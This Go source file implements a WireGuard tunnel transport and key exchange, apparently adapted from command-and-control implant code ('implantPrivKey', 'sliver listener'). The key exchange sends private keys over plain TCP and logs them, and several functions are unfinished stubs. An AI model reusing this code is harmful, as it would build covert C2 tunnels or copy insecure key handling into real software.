package wireguard

import (
	"bufio"
	"bytes"
	"context"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/netip"
	"strconv"
	"strings"

	"github.com/chainreactors/rem/protocol/core"
	"github.com/chainreactors/rem/x/utils"
	"golang.zx2c4.com/wireguard/conn"
	"golang.zx2c4.com/wireguard/device"
	"golang.zx2c4.com/wireguard/tun"
	"golang.zx2c4.com/wireguard/tun/netstack"
	"golang.zx2c4.com/wireguard/wgctrl/wgtypes"
)

var WGPeers = make(map[string]*WGPeer)
var serverPeer *WGPeer
var DefaultTunIP = "100.64.0.1"

func init() {
	core.DialerRegister(core.WireGuardTunnel, func(ctx context.Context) (core.TunnelDialer, error) {
		keyExchangePort := 1337
		netstackPort := 8888
		options := core.GetMetas(ctx)
		if port, ok := options["key_exchange_port"]; ok {
			if p, err := strconv.Atoi(fmt.Sprint(port)); err == nil {
				keyExchangePort = p
			}
		}
		if port, ok := options["netstack_port"]; ok {
			if p, err := strconv.Atoi(fmt.Sprint(port)); err == nil {
				netstackPort = p
			}
		}
		return NewWireguardDialer(ctx, keyExchangePort, netstackPort), nil
	})
	core.ListenerRegister(core.WireGuardTunnel, func(ctx context.Context) (core.TunnelListener, error) {
		keyExchangePort := 1337
		netstackPort := 8888
		options := core.GetMetas(ctx)
		if port, ok := options["key_exchange_port"]; ok {
			if p, err := strconv.Atoi(fmt.Sprint(port)); err == nil {
				keyExchangePort = p
			}
		}
		if port, ok := options["netstack_port"]; ok {
			if p, err := strconv.Atoi(fmt.Sprint(port)); err == nil {
				netstackPort = p
			}
		}
		return NewWireguardListener(ctx, keyExchangePort, netstackPort), nil
	})
}

func NewPeer(isPeer bool, tunIP string) *WGPeer {
	privateKey, publicKey, err := genWGKeys()
	if err != nil {
		return nil
	}
	WGPeers[publicKey] = &WGPeer{
		IsPeer:     isPeer,
		TunIP:      tunIP,
		PublicKey:  publicKey,
		PrivateKey: privateKey,
	}
	return WGPeers[publicKey]
}

type WGPeer struct {
	IsPeer     bool
	TunIP      string
	PublicKey  string
	PrivateKey string
}

type WireguardDialer struct {
	net.Conn
	meta                  core.Metas
	keyExchangeListenPort int
	netstackPort          int
}

type WireguardListener struct {
	listener              net.Listener
	keyExchangeListener   net.Listener
	device                *device.Device
	wgconf                *bytes.Buffer
	meta                  core.Metas
	keyExchangeListenPort int
	netstackPort          int
}

func NewWireguardDialer(ctx context.Context, keyExchangePort, netstackPort int) *WireguardDialer {
	return &WireguardDialer{
		meta:                  core.GetMetas(ctx),
		keyExchangeListenPort: keyExchangePort,
		netstackPort:          netstackPort,
	}
}

func NewWireguardListener(ctx context.Context, keyExchangePort, netstackPort int) *WireguardListener {
	return &WireguardListener{
		meta:                  core.GetMetas(ctx),
		keyExchangeListenPort: keyExchangePort,
		netstackPort:          netstackPort,
		wgconf:                bytes.NewBuffer(nil),
	}
}

func (c *WireguardListener) Addr() net.Addr {
	return c.listener.Addr()
}

func (c *WireguardDialer) Dial(dst string) (net.Conn, error) {
	// TODO: Implement Wireguard dial logic
	return nil, nil
}

func (c *WireguardListener) Listen(dst string) (net.Listener, error) {
	// TODO: Implement Wireguard listen logic
	return nil, nil
}

func (c *WireguardListener) Accept() (net.Conn, error) {
	return c.listener.Accept()
}

func (c *WireguardListener) Close() error {
	if c.listener != nil {
		return c.listener.Close()
	}
	return nil
}

func genWGKeys() (string, string, error) {
	privateKey, err := wgtypes.GeneratePrivateKey()
	if err != nil {
		return "", "", err
	}
	publicKey := privateKey.PublicKey()
	return hex.EncodeToString(privateKey[:]), hex.EncodeToString(publicKey[:]), nil
}

func (c *WireguardListener) acceptKeyExchangeConnection() {
	utils.Log.Info("Polling for connections to key exchange listener")
	for {
		conn, err := c.keyExchangeListener.Accept()
		if err != nil {
			if errType, ok := err.(*net.OpError); ok && errType.Op == "accept" {
				utils.Log.Errorf("Accept failed: %v", err)
				break
			}
			utils.Log.Errorf("Accept failed: %v", err)
			continue
		}
		utils.Log.Infof("Accepted connection to wg key exchange listener: %s", conn.RemoteAddr())
		go c.handleKeyExchangeConnection(conn)
	}
}

func (c *WireguardListener) handleKeyExchangeConnection(conn net.Conn) {
	utils.Log.Infof("Handling connection to key exchange listener")

	defer conn.Close()
	ip := fmt.Sprintf("100.64.0.%d", rand.Intn(254)+2)
	peer := NewPeer(true, ip)
	fmt.Fprintf(c.wgconf, "public_key=%s\n", peer.PublicKey)
	fmt.Fprintf(c.wgconf, "allowed_ip=%s/32\n", peer.TunIP)
	if err := c.device.IpcSetOperation(bufio.NewReader(c.wgconf)); err != nil {
		utils.Log.Error(err.Error())
	}
	utils.Log.Infof("Successfully generated new wg keys")
	message := peer.PrivateKey + "|" + serverPeer.PublicKey + "|" + string(ip)
	utils.Log.Debugf("Sending new wg keys and IP: %s", message)
	conn.Write([]byte(message))
}

func doKeyExchange(conn net.Conn) (string, string, string) {
	log.Printf("Connected to key exchange listener")
	defer conn.Close()

	// 129 = 64 byte key + 1 byte delimiter + 64 byte key + 1 byte delimiter + 16 byte ip address
	buff := make([]byte, 146)
	buffReader := bufio.NewReader(conn)

	n, err := io.ReadFull(buffReader, buff)
	if err != nil {
		utils.Log.Infof("Failed to read wg keys from key exchange listener: %s", err)
	}

	stringSlice := strings.Split(string(buff[:n]), "|")
	utils.Log.Infof("Retrieved new keys, priv:%s, pub:%s, ip:%s", stringSlice[0], stringSlice[1], stringSlice[2])

	return stringSlice[0], stringSlice[1], stringSlice[2]
}

func getSessKeys(address string, port uint16) (string, string, string, error) {
	keyExchangeConnection, err := net.Dial("tcp", fmt.Sprintf("%s:%d", address, port))
	if err != nil {
		return "", "", "", err
	}

	wgSessPrivKey, wgSessPubKey, tunAddress := doKeyExchange(keyExchangeConnection)
	if err != nil {
		return "", "", "", err
	}
	return wgSessPrivKey, wgSessPubKey, tunAddress, nil
}

func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
	wgSessPrivKey, wgSessPubKey, tunAddress, err := getSessKeys(address, 1337)
	if err != nil {
		return nil, nil, err
	}
	// Bring up actual wireguard connection using retrieved keys and IP
	_, dev, tNet, err := bringUpWGInterface(address, port, wgSessPrivKey, wgSessPubKey, tunAddress)
	if err != nil {
		return nil, nil, err
	}
	err = dev.Up()
	if err != nil {
		return nil, nil, err
	}

	connection, err := tNet.Dial("tcp", fmt.Sprintf("%s:%d", DefaultTunIP, 8888))
	if err != nil {
		utils.Log.Infof("Unable to connect to sliver listener: %v", err)
		return nil, nil, err
	}

	return connection, dev, nil
}

func bringUpWGInterface(address string, port uint16, implantPrivKey string, serverPubKey string, netstackTunIP string) (tun.Device, *device.Device, *netstack.Net, error) {
	tun, tNet, err := netstack.CreateNetTUN(
		[]netip.Addr{netip.MustParseAddr(netstackTunIP)},
		[]netip.Addr{netip.MustParseAddr("127.0.0.1")},
		1420)
	if err != nil {
		return nil, nil, nil, err
	}

	dev := device.NewDevice(tun, conn.NewDefaultBind(), device.NewLogger(device.LogLevelSilent, "[c2/wg] "))
	wgConf := bytes.NewBuffer(nil)
	fmt.Fprintf(wgConf, "private_key=%s\n", implantPrivKey)
	fmt.Fprintf(wgConf, "public_key=%s\n", serverPubKey)
	fmt.Fprintf(wgConf, "endpoint=%s:%d\n", address, port)
	fmt.Fprintf(wgConf, "allowed_ip=%s/0\n", "0.0.0.0")

	if err := dev.IpcSetOperation(bufio.NewReader(wgConf)); err != nil {
		return nil, nil, nil, err
	}

	return tun, dev, tNet, nil
}
